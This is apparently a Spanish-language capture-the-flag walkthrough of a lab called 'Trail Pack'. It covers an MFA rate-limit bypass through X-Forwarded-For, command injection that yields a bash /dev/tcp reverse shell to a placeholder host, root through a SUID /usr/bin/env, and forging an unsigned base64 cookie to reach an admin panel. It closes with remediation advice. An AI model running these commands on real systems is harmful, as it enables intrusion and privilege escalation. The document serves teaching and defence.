# Trail Pack

**Nivel:** Medio

## 1. Reconocimiento Inicial

### Escaneo de Red

El laboratorio comienza con un escaneo de nmap que revela el puerto 8000 abierto con un servicio HTTP:

![alt text](img/1-nmap.png)

### Enumeración de Directorios

Posterior a esto, se realiza un escaneo con gobuster, revelando archivos de la página, aunque sin información crítica para avanzar significativamente:

![alt text](img/2-gobuster.png)

## 2. Descubrimiento de Funcionalidades

### Interfaz de Usuario

Se accede al servicio HTTP y se identifican dos apartados importantes: uno para registrar nuevos usuarios y otro para iniciar sesión:

**Registro de Usuario:**

![alt text](img/4-register.png)

**Inicio de Sesión:**

![alt text](img/3-logIn.png)

### Enumeración de Usuarios

En el apartado de comentarios se revelan posibles usuarios del sistema:

![alt text](img/6-clients.png)

## 3. Autenticación Multifactor (MFA) - Vulnerabilidad Primera

### Descubrimiento de MFA

Al intentar iniciar sesión con credenciales de un usuario recientemente creado, se revela una funcionalidad de verificación de cuenta por código. El sistema implementa un limitador de intentos que bloquea tras 3 intentos fallidos:

![alt text](img/5-MFAverification.png)

### Bypass del Mecanismo de Protección

Al revisar la petición más a profundidad utilizando Burpsuite, se revela que es posible explotar el encabezado X-Forwarded-For. Al ser modificado, el contador de intentos del código se reinicia, permitiendo intentos ilimitados. Se elabora un script en Python para realizar un ataque de fuerza bruta contra el código de verificación:

![alt text](img/7-verificationCode.png)

**Vulnerabilidad Identificada:** Bypass de MFA mediante manipulación del header X-Forwarded-For para resetear el contador de intentos.

## 4. Acceso al Panel de Usuario

Después del bypass del MFA, se obtiene acceso a un dashboard de usuario común:

![alt text](img/8-ClientDashboard.png)

## 5. Inyección de Comandos - Vulnerabilidad Segunda

### Descubrimiento de la Vulnerabilidad

Al revisar los distintos apartados, en la sección de quejas se identifica una vulnerabilidad crítica. El sistema ejecuta cambios a nivel de código en este apartado. Al utilizar comandos en el formato `&&<Comando>`, estos son aceptados y ejecutados directamente:

![alt text](img/8-InyectionCommands.png)

### Explotación - Obtención de Reverse Shell

Se utiliza el siguiente comando para obtener una reverse shell en la máquina atacante:

```bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/IP/PORT 0>&1"
```

![alt text](img/9-Reversehell.png)

**Nota:** Se recomienda realizar una TTY shell para mayor comodidad durante la interacción con el sistema.

## 6. Enumeración de Credenciales

### Análisis del Código Fuente

En el archivo `main.py`, se revela la estructura completa de la página. Más importante aún, se descubren las credenciales de todos los usuarios existentes del sistema:

![alt text](img/10-Users.png)

**Vulnerabilidad Identificada:** Exposición de credenciales en el código fuente, lo cual constituiría una vulnerabilidad grave en un caso real.

## 7. Escalada de Privilegios - Vulnerabilidad Tercera

### Identificación de Binarios SUID

Se ejecuta una búsqueda de binarios con propiedades SUID de root:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Se obtiene un binario vulnerable: `/usr/bin/env`. Al estar disponible con permisos SUID, proporciona una vía directa para obtener una shell root mediante:

```bash
/usr/bin/env /bin/bash -p
```

![alt text](img/root.png)

**Resultado:** Se obtiene acceso con privilegios de root, completando la escalada de privilegios.

## 8. Vulnerabilidad Adicional - Cookies sin Firma

### Análisis de Sesiones

Explorando más a fondo el código fuente, se revela que las cookies de inicio de sesión (específicamente `user_info`) no poseen firma y están únicamente encriptadas en base64. Al desencriptarlas, se observa:

```json
{"user":"test","role":"user","email":"test@darklegion.xyz"}
```

### Manipulación de Roles

Dado que la encriptación es únicamente base64 (sin firma criptográfica), es posible modificar el rol de `user` a `admin` y reencriptar:

```bash
echo '{"user":"test","role":"admin","email":"test@gmail.com"}' | base64 -w 0
```

**Resultado codificado:**
```
eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoidGVzdEBnbWFpbC5jb20ifQ==
```

**Nota:** El resultado puede variar según la implementación específica del laboratorio.

### Acceso al Panel de Administración

Al revisar nuevamente el código fuente (`main.py`), se identifica un apartado `/accounting` que permite modificar el parámetro `user_info`. Al interceptar la petición con Burpsuite e inyectar la cookie modificada de administrador, se obtiene acceso sin restricciones:

![alt text](img/11-Acounting.png)

![alt text](img/12-Cookies.png)

Este acceso revela un panel de administrador que contiene la flag del laboratorio:

![alt text](img/flag.png)

**Laboratorio Completado.**

## 9. Recomendaciones de Seguridad

### 1. Implementación Robusta de MFA

**Vulnerabilidad abordada:** Bypass de MFA mediante header X-Forwarded-For

**Recomendación:** Implementar mecanismos de limitación de intentos a nivel de sesión o usuario, no basados únicamente en direcciones IP. Utilizar técnicas como:
- Rate limiting basado en sesión de usuario autenticada
- Almacenamiento de intentos fallidos en base de datos con asociación al usuario
- Implementar backoff exponencial después de intentos fallidos
- Validar y confiar únicamente en direcciones IP reales del servidor proxy inverso, configurado de forma segura
- Usar headers X-Forwarded-For solo cuando sea absolutamente necesario y validarlos contra una lista blanca de proxies confiables

### 2. Validación y Sanitización de Entrada

**Vulnerabilidad abordada:** Inyección de comandos en la sección de quejas

**Recomendación:** Implementar controles estrictos contra inyección de comandos:
- Evitar completamente la ejecución de comandos del sistema basada en entrada del usuario
- Si es necesario, usar listas blancas de comandos permitidos en lugar de intentar filtrar
- Utilizar funciones seguras de ejecución que no invoquen un shell (ej: `subprocess.run()` con `shell=False`)
- Implementar validación de entrada rigurosa con expresiones regulares específicas
- Ejecutar procesos con privilegios mínimos necesarios

### 3. Protección Criptográfica de Cookies de Sesión

**Vulnerabilidad abordada:** Cookies sin firma encriptadas únicamente en base64

**Recomendación:** Implementar mecanismos de protección criptográfica para cookies:
- Usar firmas digitales (HMAC) para garantizar la integridad de las cookies
- Utilizar encriptación robusta (AES-256) además de firmado
- Implementar funciones de hash criptográficas seguras (SHA-256 o superior)
- Considerar usar bibliotecas establecidas de gestión de sesiones (ej: Flask-Session, Express-Session)
- Nunca confiar datos sensibles exclusivamente en base64, ya que no es criptografía
- Implementar expiración de sesiones y rotación de tokens

### 4. Minimización de Permisos SUID

**Vulnerabilidad abordada:** Disponibilidad de `/usr/bin/env` con permiso SUID

**Recomendación:** Implementar principios de privilegios mínimos:
- Auditar regularmente todos los binarios con permiso SUID en el sistema
- Remover SUID de binarios que no lo requieran absolutamente
- Utilizar alternativas más seguras como `sudo` con configuración específica
- Implementar AppArmor o SELinux para restringir las capacidades de binarios SUID
- Mantener un registro centralizado de todos los archivos con SUID activo
- Realizar auditorías periódicas de permisos en el sistema de archivos






